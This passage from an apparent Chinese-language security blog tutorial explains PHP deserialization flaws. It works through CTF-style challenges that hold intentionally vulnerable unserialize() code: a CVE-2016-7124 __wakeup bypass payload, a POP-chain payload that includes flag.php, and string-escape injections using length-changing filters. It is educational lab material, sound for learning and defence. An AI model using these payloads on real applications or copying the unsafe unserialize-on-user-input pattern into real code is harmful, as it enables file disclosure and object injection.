        <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$funcion_name</span><span class="p">,</span><span class="nv">$arguments</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">echo</span><span class="s2">&#34;你调用的函数:&#34;</span><span class="o">.</span><span class="nv">$funcion_name</span><span class="o">.</span><span class="s2">&#34;(参数:&#34;</span><span class="p">;</span>
            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$arguments</span><span class="p">);</span> <span class="c1">//数组要用print_r()
</span><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;)不存在！&#34;</span><span class="p">;</span>
        <span class="p">}</span>
     <span class="p">}</span>

     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> 
     <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">person</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;age&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
     <span class="c1">//你调用的函数:person(参数:Array ( [0] =&gt; name [1] =&gt; age [2] =&gt; sex ) )不存在！
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code>__get()</code></p>
<ul>
<li>访问private对象。</li>
<li>访问不存在对象。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;theoyu&#34;</span><span class="p">,</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;__get()&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$man</span><span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">sex</span><span class="p">;</span>
<span class="cm">/*
</span><span class="cm">1
</span><span class="cm">__get()
</span><span class="cm">__get()
</span><span class="cm">*/</span>

</code></pre></div><h2 id="反序列化漏洞">反序列化漏洞</h2>
<h3 id="eg1">e.g.1</h3>
<ul>
<li><strong>CVE-2016-7124漏洞</strong>：当序列化字符串中表示<strong>对象属性个数的值</strong>大于<strong>真实的属性个数</strong>时会<strong>跳过</strong>__wakeup的执行。</li>
<li>
<blockquote>
<p>要求版本:PHP5&lt;5.6.25   PHP7&lt;7.0.10</p>
</blockquote>
</li>
<li>index.php:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">loudong</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">echo</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
                    <span class="nx">show_source</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Wrong filename&#39;</span><span class="p">);</span>
            <span class="p">}</span> 
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="s1">&#39;this is tostring&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        

    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
    <span class="p">{</span>
        <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
        <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span><span class="err">  &lt;!-- key in flag.php --&gt;
</span></code></pre></div><p>分析其中的几个函数<strong>strchr(&lsquo;a&rsquo;,&lsquo;b&rsquo;)</strong>:在a中搜索字串b，搜索成功返回剩下字串，失败return false。</p>
<p><strong>代码审计</strong></p>
<ol>
<li>提示flag在flag.php里面，我们要想办法读到里面的内容。</li>
<li>在析构函数中，<strong>show_source(dirname(<strong>FILE</strong>).'/'.$this-&gt;file)</strong>,<strong>dirname</strong>返回的是文件所在文件夹的绝对路径，拼接后面的 <strong>/$this-&gt;file</strong> ,想办法看能不能把file改为flag.php.</li>
<li>在 <strong>__wakeup()</strong> 中，反系列化会自动调用把file置为index.php，那我们希望绕过这个函数。</li>
</ol>
<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
<blockquote>
<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
</blockquote>
<ul>
<li>正常构造序列化对象:<code>O:7:&quot;loudong&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></li>
<li>绕过:<code>O:7:&quot;loudong&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>//或i:8:&ldquo;flag.php都可</li>
</ul>
<h3 id="eg2">e.g.2</h3>
<p>一道考察多方面的题</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">start_gg</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Call</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="nf">test1</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>    
<span class="k">class</span> <span class="nc">funct</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$test2</span><span class="p">,</span><span class="nv">$arr</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="nv">$s1</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
                <span class="nv">$s1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">func</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod2</span> <span class="o">=</span> <span class="s2">&#34;字符串拼接&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
        <span class="p">}</span> 
<span class="p">}</span>
<span class="k">class</span> <span class="nc">string1</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$str2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span><span class="o">-&gt;</span><span class="na">get_flag</span><span class="p">();</span>
                <span class="k">return</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">GetFlag</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="nf">get_flag</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="k">include</span><span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;string&#39;</span><span class="p">];</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><blockquote>
<p>如何在一个类中实例化另一个类呢？利用类的构造函数，只要第一个类被实例化就会自动实例化我们需要另外构造的类。</p>
</blockquote>
<p><strong>思路</strong>：</p>
<ol>
<li>要想得到flag，需要调用GetFlag类中的get_flag()函数。</li>
<li>在string1类可以看出，我们需要把str1实例化为GetFlag类的对象，然后看有没有字符串能调用__toString()函数。</li>
<li>往上看，func类中，__invoke()函数存在字符串拼接，满足2的预期，需要把mod2实例化为string1的对象，再找找有没有把对象当作函数的地方来调用__invoke()。</li>
<li>在funct类中找到调用$s1()函数，只需将mod1实例化为func类的对象，再找找有没有调用不存在函数的地方。</li>
<li>芜湖,我们发现Call类中test1()函数就调用了不存在的函数，我们需要把mod1实例化为funct的对象。</li>
<li>最后一步！往上看！在start__gg的析构函数就调用了test1()函数，那我们只需要把mod1实例化为__Call的对象就可以了！</li>
</ol>
<p>最后构造！</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">start_gg</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Call</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Call</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">funct</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">funct</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">func</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">func</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">string1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">string1</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GetFlag</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">GetFlag</span> <span class="p">{}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">start_gg</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="c1">//O:8:&#34;start_gg&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;Call&#34;:1:{s:4:&#34;mod1&#34;;O:5:&#34;funct&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;func&#34;:1:{s:4:&#34;mod1&#34;;O:7:&#34;string1&#34;:1:{s:4:&#34;str1&#34;;O:7:&#34;GetFlag&#34;:0:{}}}}}}
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>payload serialize($a),得到flag。</p>
<h2 id="拓展">拓展</h2>
<h3 id="字符串逃逸">字符串逃逸</h3>
<blockquote>
<p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-526902876.png" alt=""></p>
<p>可以看到<code>}</code>以外的部分并没有反序列化。</p>
<h4 id="函数使字符变多">函数使字符变多</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/t/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;ww&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;theoyu&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>在这个例子中，<code>filter</code>会把字符串中的t替换为两个w
我们看看输出：
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2412547197.png" alt="">
可以看到filter后，我们的username变成了<code>wwheoyu</code>，为7个字符，但filter是在序列化后，所以其6个字节的长度并没有更改，也就导致了反序列失败。</p>
<p>这里我们假设一点，username是一个我们可以控制输入的变量，<code>$age=20</code>是一个不可更改的量，那我们就可以利用上面的filter函数来篡改age。</p>
<p>username我们可以控制，那么通过闭合的思想，如果我们在username的末尾构造了<code>&quot;;i:1;i:18;}</code>,那么在反序列化时，真正的age部分就会因为在<code>}</code>以外而被忽略，默认username内我们构造的age为真，达到了篡改的目的。(有点像sql注入的闭合)</p>
<p>我们已经知道了一点，filter函数的存在，username内每一个<code>t</code>将被替换为<code>ww</code>，就会导致长度+1,如果我们想构造username=<code>xxxx&quot;;i:1;i:18;}</code>,就需要把长度增加12位，那么我只需要构造username=<code>tttttttttttt&quot;;i:1;i:18;}</code>即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1602856666.png" alt="">
如果后面我们需要添加的内容不是前面每次增加字符的整数倍，可以在<code>}</code>外面随便加一些内容使长度为前面的倍数。</p>
<h3 id="函数使字符变少">函数使字符变少</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;ttheoyu&#39;</span><span class="p">;</span>
<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;game&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2167858145.png" alt="">
字符减少的情况一般不止一个可修改的变量，这里我们加入<code>$love</code>变量，为什么要加入呢？与之前字符增加不一样，这里字符减少，只会把我们后面的一个变量的内容吞并，所以我要做的就是在username处构造适当的<code>tt</code>，把<code>$love</code>的关于长度部分给吞并掉，然后在<code>love</code>部分构造<code>;i:1;s:4:&quot;game&quot;;i:2;i:18;}</code>把前面被吞掉的部分补上，后面再伪造虚拟的<code>$age</code>,即可篡改。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">#随便构造几个tt
</span><span class="c1"></span><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;tttttttttttttttt&#39;</span><span class="p">;</span>
<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;;i:1;s:4:&#34;game&#34;;i:2;i:18;}&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3288670259.png" alt="">
我们数一下被应该被吞的部分 ，就是<code>&quot;;i:1;s:26:</code>,一共是11个字符，那么我们构造22个<code>t</code>即可。
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-510433908.png" alt=""></p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a></li>
<li><a href="https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
